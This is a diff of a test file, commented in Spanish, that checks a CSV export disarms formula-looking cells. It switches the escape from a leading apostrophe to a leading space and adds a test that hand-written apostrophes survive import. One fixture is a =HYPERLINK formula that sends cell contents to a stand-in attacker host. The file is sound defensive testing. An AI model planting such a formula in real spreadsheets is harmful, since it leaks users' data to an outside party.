@@ -176,11 +176,11 @@ describe("the csv round trip", () => {
   it("never lets a text cell run as a formula when Excel opens it", () => {
     const lines = buildExchangeCsv(formulas).toString("utf8").split("\r\n");
 
-    expect(lines[1]).toBe(`"'=HYPERLINK(""http://evil.example/?d=""&A1)",-5`);
-    expect(lines[2]).toBe("'+34 600 000 000,");
-    expect(lines[3]).toBe("'-coste de material,");
-    expect(lines[4]).toBe("'@SUM(A1:A9),");
-    expect(lines[5]).toBe("'\tTabulado,");
+    expect(lines[1]).toBe(`" =HYPERLINK(""http://evil.example/?d=""&A1)",-5`);
+    expect(lines[2]).toBe(" +34 600 000 000,");
+    expect(lines[3]).toBe(" -coste de material,");
+    expect(lines[4]).toBe(" @SUM(A1:A9),");
+    expect(lines[5]).toBe(" \tTabulado,");
   });
 
   it("reads formula-looking text back exactly as it was written", async () => {
@@ -191,11 +191,22 @@ describe("the csv round trip", () => {
       "+34 600 000 000",
       "-coste de material",
       "@SUM(A1:A9)",
-      // El importador recorta los extremos de toda celda; lo que importa es
-      // que el apostrofo no sobreviva.
+      // El importador recorta los extremos de toda celda, que es justo lo
+      // que deshace el espacio que puso la exportacion.
       "Tabulado",
     ]);
     expect(cellText(parsed.rows[0]?.[1] ?? null)).toBe("-5");
+  });
+
+  // El desarme no se deshace al leer: un CSV cualquiera no salio de aqui, y
+  // quitarle la comilla de delante se comeria la que escribio una persona.
+  it("leaves a hand-written apostrophe where its author put it", async () => {
+    const csv = Buffer.from(
+      "\ufeffT\u00edtulo,Estado\r\n'-Urgente-',Por hacer\r\n",
+    );
+    const parsed = await parseUploadedFile(csv, "x.csv");
+
+    expect(cellText(parsed.rows[0]?.[0] ?? null)).toBe("'-Urgente-'");
   });
 });
 
